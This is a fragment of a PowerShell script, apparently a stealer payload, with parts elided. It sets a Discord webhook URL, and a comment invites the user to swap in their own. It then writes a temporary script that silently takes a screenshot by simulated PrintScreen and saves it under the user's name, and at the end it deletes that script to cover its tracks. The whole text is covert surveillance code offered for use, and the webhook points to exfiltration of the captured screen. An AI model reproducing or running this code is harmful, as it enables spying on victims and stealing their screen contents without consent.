#CHANGE URL TO YOUR URL
  $url="https://discord.com/api/webhooks/1247670860190584884/G7SdYHwgibfF6KCvNWg1-3ldcmI3WgGIMeOraABtjTK8SCmMBNu_1S09sLQi2nwmuzGD" ;
...
# Screenshot
  cd "$env:temp";
  echo 'function Get-ScreenCapture' > "script.ps1";
  echo '{' >> "script.ps1";
  echo '    begin {' >> "script.ps1";
  echo '        Add-Type -AssemblyName System.Drawing, System.Windows.Forms' >> "script.ps1";
  echo '        Add-Type -AssemblyName System.Drawing' >> "script.ps1";
  echo '        $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |' >> "script.ps1";
  echo '            Where-Object { $_.FormatDescription -eq "JPEG" }' >> "script.ps1";
  echo '    }' >> "script.ps1";
  echo '    process {' >> "script.ps1";
  echo '        Start-Sleep -Milliseconds 44' >> "script.ps1";
  echo '            [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")' >> "script.ps1";
  echo '        Start-Sleep -Milliseconds 550' >> "script.ps1";
  echo '        $bitmap = [Windows.Forms.Clipboard]::GetImage()' >> "script.ps1";
  echo '        $ep = New-Object Drawing.Imaging.EncoderParameters' >> "script.ps1";
  echo '        $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)' >> "script.ps1";
  echo '        $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture"' >> "script.ps1";
  echo '        $bitmap.Save("${screenCapturePathBase}.jpg", $jpegCodec, $ep)' >> "script.ps1";
  echo '    }' >> "script.ps1";
  echo '}' >> "script.ps1";
  echo 'Get-ScreenCapture' >> "script.ps1";
  $screencapture = echo $env:temp"\"$env:UserName"_Capture"
  powershell -c $env:temp\script.ps1;
  $Screencap = "$env:temp\script.ps1";
...
# Delete this script
  Remove-Item  $env:temp\script.ps1 -Force -Recurse;
